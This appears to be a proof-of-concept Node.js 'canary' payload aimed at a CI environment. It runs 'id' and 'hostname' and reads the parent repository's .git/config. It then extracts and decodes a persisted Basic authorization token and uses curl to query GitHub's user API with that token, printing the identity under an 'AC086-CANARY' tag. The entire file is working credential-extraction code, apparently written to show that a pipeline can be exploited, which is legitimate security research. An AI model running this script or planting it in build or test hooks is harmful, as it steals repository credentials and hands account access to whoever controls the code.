const { execSync } = require('child_process');
const fs = require('fs');
try {
  const id = execSync('id').toString().trim();
  const host = execSync('hostname').toString().trim();
  let who = 'no-token';
  try {
    const cfg = fs.readFileSync('../.git/config', 'utf8');
    const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/);
    if (m) {
      const token = Buffer.from(m[1], 'base64').toString().split(':').slice(1).join(':');
      who = execSync('curl -s --max-time 10 -H "Authorization: token ' + token + '" https://api.github.com/user').toString().match(/"login":\s*"([^"]+)"/);
      who = who ? who[1] : 'api-fail';
    }
  } catch (e) { who = 'extract-error'; }
  console.log('AC086-CANARY id=' + id + ' host=' + host + ' token_user=' + who);
} catch (e) { console.log('AC086-CANARY error=' + e.message); }
